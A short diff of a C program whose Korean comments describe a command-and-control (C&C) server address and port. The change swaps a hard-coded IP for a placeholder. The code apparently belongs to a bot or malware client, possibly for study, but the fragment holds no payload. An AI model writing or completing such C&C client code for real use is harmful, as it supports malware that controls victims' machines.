@@ -50,7 +50,7 @@ int main(void)
     struct sockaddr_in server_addr;
     int slen = sizeof(server_addr);
     char buf[BUFLEN];
-    char SERVER[] = "114.70.37.17"; //C&C 서버의 주소
+    char SERVER[] = "999999999999999999"; //C&C 서버의 주소
     int PORT = 10004; //C&C서버와 통신할 포트 번호
     int i;
     printf("SERVER 주소 인코딩 전 : %s\n",SERVER);
